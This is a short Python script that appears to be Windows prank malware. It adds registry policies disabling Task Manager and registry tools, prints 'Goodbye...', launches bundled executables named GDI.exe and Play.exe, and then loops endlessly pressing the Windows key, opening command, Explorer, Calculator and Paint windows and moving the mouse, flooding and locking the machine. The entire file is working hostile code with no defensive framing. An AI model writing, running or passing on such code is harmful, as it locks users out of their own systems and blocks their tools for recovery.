import os
import pyautogui
import time

newStarted = False

#Lock all
os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f')
os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f')

os.system("cls")
os.system("color 4")
print("Goodbye...")
time.sleep(3)

#Main
os.system("start Other\\GDI.exe")
os.system("start Other\\Play.exe")

while True:
		pyautogui.press('win')
		os.system("start")
		os.system("start explorer.exe")
		os.system("start calc.exe")
		os.system("start mspaint.exe")

		pyautogui.moveTo(30, 30)
		pyautogui.moveTo(10, 20)
		pyautogui.moveTo(11, 67)